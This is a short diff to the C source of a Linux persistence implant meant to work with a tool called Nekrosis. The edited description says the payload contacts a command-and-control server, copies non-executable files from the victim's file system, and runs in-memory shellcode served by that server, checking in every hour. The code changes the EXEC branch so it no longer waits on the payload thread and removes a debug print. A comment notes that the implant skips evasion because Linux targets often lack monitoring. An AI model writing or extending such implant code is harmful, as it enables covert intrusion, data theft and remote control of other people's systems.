@@ -52,7 +52,8 @@
 
 /* DESCRIPTION:
  * This is a pure C payload meant to target Linux systems in an effort to establish persistence. It was made to be used in conjunction with the Nekrosis application.
- * This payload will attempt to contact the C2, after which it may receive instruction to walk the file system and copy all non-executable files.
+ * This payload will attempt to contact the C2, after which it may receive instruction to walk the file system and copy all non-executable files, or instruction to execute a stub of shellcode that is being
+ * served at the C2 address. This stub will never touch disk. The control loop reaches back out to the controller once per hour, meaning that different modules can be called at different times.
  * 
  * NOTE: This payload currently implements no obfuscation or evasion techniques. These are not necessary in most cases as many Linux targets do not have monitoring solutions.
 */
@@ -100,9 +101,7 @@ int main(void) {
 		} else if (strcmp(controllerDirective, "EXEC") == 0) {
 			pthread_t thread_id;
 			pthread_create(&thread_id, NULL, ExecutePayload, NULL);			// Creating the thread
-			pthread_join(thread_id, NULL);						// Waiting for the thread to complete
-			// ExecutePayload();
-			printf("After thread\n");
+			// pthread_join(thread_id, NULL);						// Waiting for the thread to complete
 			system("rm tmp");
 		}
 		sleep(3600);
